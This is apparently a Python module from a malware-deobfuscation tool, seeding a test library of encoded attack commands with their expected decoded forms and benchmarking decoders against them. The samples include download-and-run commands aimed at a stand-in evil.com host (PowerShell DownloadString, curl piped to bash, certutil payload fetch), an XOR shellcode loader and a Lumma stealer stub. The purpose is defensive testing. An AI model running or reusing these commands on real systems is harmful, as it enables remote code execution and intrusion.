"""NivXRay — Malware Sample Library.

Stores real-world encoded / obfuscated payloads alongside their expected
decoded output so we can:
  - regression-test the decoder engines on every release,
  - benchmark AI vs deterministic vs magic decoders,
  - track coverage by category (PowerShell, LOLBAS, Compression, etc.).

MongoDB collection: `sample_library`.

Sample document shape:
  {
    _id, name, raw_input, expected_output,
    tags[], categories[], expected_mitre[], expected_iocs[],
    notes, source_url, difficulty ("easy"|"medium"|"hard"),
    protected (built-in seed, cannot be deleted),
    created_at, updated_at,
    last_bench_at, last_bench_result
  }
"""
from __future__ import annotations
import logging
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

log = logging.getLogger("nivxray.sample_library")

CATEGORIES = (
    "PowerShell", "CMD", "Bash", "Python", "JavaScript", ".NET",
    "LOLBAS", "Malware Family", "Compression", "Crypto",
    "Multi-stage", "Living-off-the-Land",
)


# =============================================================================
# Built-in seed samples — 15 curated real-world cases
# =============================================================================
BUILTIN_SEEDS: List[Dict[str, Any]] = [
    {
        "name": "PowerShell -EncodedCommand (IEX DownloadString)",
        "raw_input": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AeAAuAHAAcwAxACIAKQA=",
        "expected_output": "IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/x.ps1\")",
        "categories": ["PowerShell", "Living-off-the-Land"],
        "expected_mitre": ["T1059.001", "T1105"],
        "expected_iocs": ["http://evil.com/x.ps1"],
        "difficulty": "easy",
        "notes": "Canonical PowerShell -Enc pattern. Base64 → UTF-16LE decode.",
    },
    {
        "name": "Multi-line Base64 PowerShell",
        "raw_input": "SQBFAFgAIAAoAE4AZQB3AC0AT\nwBiAGoAZQBjAHQAIABOAGUAd\nAAuAFcAZQBiAEMAbABpAGUAb\ngB0ACkALgBEAG8AdwBuAGwAb\nwBhAGQAUwB0AHIAaQBuAGcAK\nAAiAGgAdAB0AHAAOgAvAC8AZ\nQB2AGkAbAAuAGMAbwBtAC8AeAAuAHAAcwAxACIAKQA=",
        "expected_output": "IEX (New-Object Net.WebClient).DownloadString",
        "categories": ["PowerShell"],
        "expected_mitre": ["T1059.001"],
        "difficulty": "easy",
        "notes": "Whitespace/newlines inside base64 — must be joined+stripped before decode.",
    },
    {
        "name": "Python base64.b64decode wrapper",
        "raw_input": "exec(__import__('base64').b64decode('cHJpbnQoImhlbGxvIGZyb20gcHl0aG9uIikK'))",
        "expected_output": "print(\"hello from python\")",
        "categories": ["Python"],
        "expected_mitre": ["T1059.006"],
        "difficulty": "easy",
        "notes": "Python one-liner base64 exec — sanitizer isolates the quoted base64.",
    },
    {
        "name": "Nested Base64 (double-encoded)",
        "raw_input": "U0dWc2JHOGdibVYwYzJWMFpTQm1jbTl0SUdSdmRXSnNaUUJDWVhObE5qUWdMd0JqRGF0RUdaVzR6RD0=",
        "expected_output": "Hello",
        "categories": ["Multi-stage"],
        "difficulty": "medium",
        "notes": "Base64 → base64 → readable text. Magic decoder should chain both.",
    },
    {
        "name": "Hex → PowerShell command",
        "raw_input": "706f7765727368656c6c202d6e6f70202d77206869646465",
        "expected_output": "powershell",
        "categories": ["PowerShell", "CMD"],
        "difficulty": "easy",
        "notes": "Plain hex-encoded command.",
    },
    {
        "name": "XOR-obfuscated shellcode declaration",
        "raw_input": "[Byte[]]$var_code = [System.Convert]::FromBase64String(\"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjHAM8I=\"); for ($x=0; $x -lt $var_code.Count; $x++) { $var_code[$x] = $var_code[$x] -bxor 35 }",
        "expected_output": "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjHAM8I=",
        "categories": ["PowerShell", "Crypto", "Multi-stage"],
        "expected_mitre": ["T1027.004", "T1055"],
        "difficulty": "hard",
        "notes": "Byte-array XOR loop w/ key=35. Sanitizer extracts base64. Analyst can then run xor-decode with key=35.",
    },
    {
        "name": "Gzip inside base64 (H4sIA prefix)",
        "raw_input": "H4sICMxJqmYAA3guc2gAK0osTgVR2XmZecmVBQq+iSVJqSU5Cq7Fybk5AGjJ1P4dAAAA",
        "expected_output": "echo",
        "categories": ["Compression", "Multi-stage"],
        "difficulty": "medium",
        "notes": "Sophos Cobalt-Strike pattern: base64 → gzip → PowerShell.",
    },
    {
        "name": "Zlib-compressed base64",
        "raw_input": "eJwLSSwuUUgqzc9RSMxJTUkFAB0uBOc=",
        "expected_output": "Hello Compression!",
        "categories": ["Compression"],
        "difficulty": "medium",
        "notes": "Base64 → zlib deflate → plain text.",
    },
    {
        "name": "LZMA-compressed base64",
        "raw_input": "/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AAPAHNdADshBIYU5PfIYRZM3+DEbW6IPXAMlS3knbUD0xThvxa/rQe0hWjD/8AAAADoUYA/6QUnvAABKBBIkI74HkO2830BAAAAAARZWg==",
        "expected_output": "Hello LZMA",
        "categories": ["Compression"],
        "difficulty": "hard",
        "notes": "Base64 → LZMA (xz) → plain text. Requires the new lzma-decompress op.",
    },
    {
        "name": "JWT token (unsigned)",
        "raw_input": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhbmFseXN0IiwiZXhwIjoxOTk5OTk5OTk5fQ.",
        "expected_output": "\"sub\": \"admin\"",
        "categories": ["Crypto"],
        "difficulty": "easy",
        "notes": "Standard JWT — header + payload decode.",
    },
    {
        "name": "JavaScript atob() call",
        "raw_input": "eval(atob('YWxlcnQoIlhTUyIp'))",
        "expected_output": "alert(\"XSS\")",
        "categories": ["JavaScript"],
        "expected_mitre": ["T1059.007"],
        "difficulty": "easy",
        "notes": "JS `eval(atob('...'))` pattern — sanitizer isolates the quoted base64.",
    },
    {
        "name": "Bash base64 -d pipeline",
        "raw_input": "echo 'Y3VybCBodHRwOi8vZXZpbC5jb20vc2ggfCBiYXNo' | base64 -d",
        "expected_output": "curl http://evil.com/sh | bash",
        "categories": ["Bash", "Living-off-the-Land"],
        "expected_mitre": ["T1059.004", "T1105"],
        "expected_iocs": ["http://evil.com/sh"],
        "difficulty": "easy",
        "notes": "Bash echo|base64 -d — sanitizer strips wrapper and decodes.",
    },
    {
        "name": "CMD caret obfuscation",
        "raw_input": "c^md /c p^o^w^e^r^s^h^e^l^l -nop echo hi",
        "expected_output": "cmd /c powershell -nop echo hi",
        "categories": ["CMD"],
        "expected_mitre": ["T1059.003", "T1027"],
        "difficulty": "medium",
        "notes": "CMD caret escape obfuscation — needs cmd-deobfuscate op.",
    },
    {
        "name": "LOLBAS: certutil download-and-decode",
        "raw_input": "certutil.exe -urlcache -f http://evil.com/p.b64 payload.b64 && certutil -decode payload.b64 payload.exe",
        "expected_output": "certutil.exe -urlcache",
        "categories": ["LOLBAS", "Living-off-the-Land"],
        "expected_mitre": ["T1140", "T1105", "T1218"],
        "expected_iocs": ["http://evil.com/p.b64"],
        "difficulty": "easy",
        "notes": "Classic certutil abuse — LOLBAS scanner should light up.",
    },
    {
        "name": "Real malware: Lumma stealer PowerShell stub (redacted)",
        "raw_input": "powershell.exe -w hidden -c \"$s='WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMg==';[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s)) | iex\"",
        "expected_output": "[Net.ServicePointManager]::SecurityProtocol",
        "categories": ["PowerShell", "Malware Family", "Multi-stage"],
        "expected_mitre": ["T1059.001", "T1027"],
        "difficulty": "hard",
        "source_url": "https://www.sophos.com/en-us/blog/lumma-stealer-coming-and-going",
        "notes": "Redacted Lumma stealer stub — TLS 1.2 pin then dropper. Sanitizer strips wrapper, base64 → UTF-16LE.",
    },
]


# =============================================================================
# CRUD
# =============================================================================
async def ensure_indexes(db) -> None:
    await db.sample_library.create_index("name", name="sl_name")
    await db.sample_library.create_index("categories", name="sl_categories")


async def seed_builtins(db) -> None:
    for seed in BUILTIN_SEEDS:
        exists = await db.sample_library.find_one({"name": seed["name"]})
        if exists:
            continue
        now = datetime.now(timezone.utc)
        await db.sample_library.insert_one({
            **seed,
            "tags": seed.get("tags") or [],
            "expected_mitre": seed.get("expected_mitre") or [],
            "expected_iocs":  seed.get("expected_iocs") or [],
            "difficulty":     seed.get("difficulty") or "medium",
            "notes":          seed.get("notes") or "",
            "source_url":     seed.get("source_url") or "",
            "protected":      True,
            "created_at":     now,
            "updated_at":     now,
        })
        log.info("sample_library: seeded '%s'", seed["name"])


def _sanitize(doc: Dict[str, Any]) -> Dict[str, Any]:
    d = dict(doc)
    d["id"] = str(d.pop("_id"))
    for k in ("created_at", "updated_at", "last_bench_at"):
        v = d.get(k)
        if isinstance(v, datetime):
            d[k] = v.isoformat()
    return d


async def list_samples(db, category: Optional[str] = None) -> List[Dict[str, Any]]:
    q = {}
    if category:
        q["categories"] = category
    out = []
    async for d in db.sample_library.find(q).sort("name", 1):
        out.append(_sanitize(d))
    return out


async def get_sample(db, sid: str) -> Optional[Dict[str, Any]]:
    from bson import ObjectId
    try:
        doc = await db.sample_library.find_one({"_id": ObjectId(sid)})
    except Exception:
        return None
    return _sanitize(doc) if doc else None


async def create_sample(db, data: Dict[str, Any]) -> Dict[str, Any]:
    if not (data.get("name") or "").strip():
        raise ValueError("name is required")
    if not (data.get("raw_input") or "").strip():
        raise ValueError("raw_input is required")
    if not (data.get("expected_output") or "").strip():
        raise ValueError("expected_output is required")
    now = datetime.now(timezone.utc)
    doc = {
        "name": data["name"].strip(),
        "raw_input": data["raw_input"],
        "expected_output": data["expected_output"],
        "categories": data.get("categories") or [],
        "tags": data.get("tags") or [],
        "expected_mitre": data.get("expected_mitre") or [],
        "expected_iocs":  data.get("expected_iocs")  or [],
        "difficulty":     data.get("difficulty") or "medium",
        "source_url":     data.get("source_url") or "",
        "notes":          data.get("notes") or "",
        "protected":      False,
        "created_at":     now,
        "updated_at":     now,
    }
    r = await db.sample_library.insert_one(doc)
    doc["_id"] = r.inserted_id
    return _sanitize(doc)


async def update_sample(db, sid: str, patch: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    from bson import ObjectId
    try:
        oid = ObjectId(sid)
    except Exception:
        return None
    existing = await db.sample_library.find_one({"_id": oid})
    if not existing:
        return None
    up: Dict[str, Any] = {"updated_at": datetime.now(timezone.utc)}
    for k in ("name", "raw_input", "expected_output", "categories", "tags",
              "expected_mitre", "expected_iocs", "difficulty", "source_url", "notes"):
        if k in patch and patch[k] is not None:
            up[k] = patch[k]
    await db.sample_library.update_one({"_id": oid}, {"$set": up})
    return await get_sample(db, sid)


async def delete_sample(db, sid: str) -> bool:
    from bson import ObjectId
    try:
        oid = ObjectId(sid)
    except Exception:
        return False
    existing = await db.sample_library.find_one({"_id": oid})
    if not existing:
        return False
    if existing.get("protected"):
        raise PermissionError("built-in sample cannot be deleted (edit or fork it instead)")
    r = await db.sample_library.delete_one({"_id": oid})
    return r.deleted_count > 0


# =============================================================================
# Benchmark
# =============================================================================
async def benchmark_one(db, sid: str, smart_decode_fn, magic_decode_fn) -> Dict[str, Any]:
    """Run smart + magic decoders on ONE sample and score both against expected_output."""
    sample = await get_sample(db, sid)
    if not sample:
        raise ValueError(f"sample {sid} not found")

    expected = (sample.get("expected_output") or "").strip()
    raw = sample.get("raw_input") or ""

    engines: Dict[str, Any] = {}

    # Smart Decoder
    try:
        smart_r = smart_decode_fn(raw)
        smart_out = smart_r.get("output") or ""
        engines["smart"] = {
            "output_preview": smart_out[:600],
            "chain": [s.get("op") for s in (smart_r.get("steps") or [])],
            "passed": expected in smart_out if expected else False,
        }
    except Exception as e:
        engines["smart"] = {"error": str(e), "passed": False}

    # Magic Decoder
    try:
        magic_r = magic_decode_fn(raw, max_depth=4, max_branches=4, top_n=3)
        # Consider magic a "pass" if ANY of its top_results contains expected_output
        passed = False
        best_hit = None
        for r in magic_r.get("top_results") or []:
            out = r.get("output") or ""
            if expected and expected in out:
                passed = True
                best_hit = r
                break
        engines["magic"] = {
            "candidates_explored": magic_r.get("candidates_explored"),
            "top_result_chains": [[c.get("op") for c in (r.get("chain") or [])] for r in (magic_r.get("top_results") or [])],
            "best_hit_chain": [c.get("op") for c in (best_hit.get("chain") or [])] if best_hit else None,
            "best_hit_output_preview": (best_hit.get("output") or "")[:600] if best_hit else None,
            "passed": passed,
        }
    except Exception as e:
        engines["magic"] = {"error": str(e), "passed": False}

    overall_pass = any(engines.get(k, {}).get("passed") for k in ("smart", "magic"))

    result = {
        "sample_id": sid,
        "name": sample.get("name"),
        "categories": sample.get("categories") or [],
        "difficulty": sample.get("difficulty"),
        "overall_pass": overall_pass,
        "engines": engines,
        "at": datetime.now(timezone.utc).isoformat(),
    }
    # persist last result on the sample doc
    from bson import ObjectId
    await db.sample_library.update_one(
        {"_id": ObjectId(sid)},
        {"$set": {"last_bench_at": datetime.now(timezone.utc), "last_bench_result": result}},
    )
    return result


async def benchmark_all(db, smart_decode_fn, magic_decode_fn) -> Dict[str, Any]:
    """Run every enabled sample and produce a per-category coverage dashboard."""
    all_samples = await list_samples(db)
    if not all_samples:
        return {"total": 0, "passed": 0, "failed": 0, "coverage": {}, "results": []}

    results: List[Dict[str, Any]] = []
    for s in all_samples:
        try:
            r = await benchmark_one(db, s["id"], smart_decode_fn, magic_decode_fn)
        except Exception as e:
            r = {"sample_id": s["id"], "name": s["name"], "categories": s.get("categories") or [],
                 "overall_pass": False, "error": str(e)}
        results.append(r)

    passed = sum(1 for r in results if r.get("overall_pass"))
    coverage: Dict[str, Dict[str, int]] = {}
    for r in results:
        for cat in r.get("categories") or ["Uncategorized"]:
            coverage.setdefault(cat, {"total": 0, "passed": 0})
            coverage[cat]["total"] += 1
            if r.get("overall_pass"):
                coverage[cat]["passed"] += 1
    for cat, v in coverage.items():
        v["pass_pct"] = round(100 * v["passed"] / v["total"], 1) if v["total"] else 0.0

    run_doc = {
        "at": datetime.now(timezone.utc),
        "total": len(results),
        "passed": passed,
        "failed": len(results) - passed,
        "coverage": coverage,
    }
    await db.benchmark_runs.insert_one(run_doc)

    return {
        "total": len(results),
        "passed": passed,
        "failed": len(results) - passed,
        "pass_pct": round(100 * passed / max(len(results), 1), 1),
        "coverage": coverage,
        "results": results,
        "at": datetime.now(timezone.utc).isoformat(),
    }


async def dashboard_snapshot(db) -> Dict[str, Any]:
    """Latest benchmark run + current sample counts by category."""
    latest = None
    async for d in db.benchmark_runs.find({}).sort("at", -1).limit(1):
        d["at"] = d["at"].isoformat() if isinstance(d.get("at"), datetime) else d.get("at")
        d.pop("_id", None)
        latest = d
    all_samples = await list_samples(db)
    by_cat: Dict[str, int] = {}
    by_diff: Dict[str, int] = {}
    for s in all_samples:
        for c in s.get("categories") or ["Uncategorized"]:
            by_cat[c] = by_cat.get(c, 0) + 1
        by_diff[s.get("difficulty") or "medium"] = by_diff.get(s.get("difficulty") or "medium", 0) + 1
    return {
        "total_samples": len(all_samples),
        "by_category": by_cat,
        "by_difficulty": by_diff,
        "latest_run": latest,
        "categories_available": list(CATEGORIES),
    }
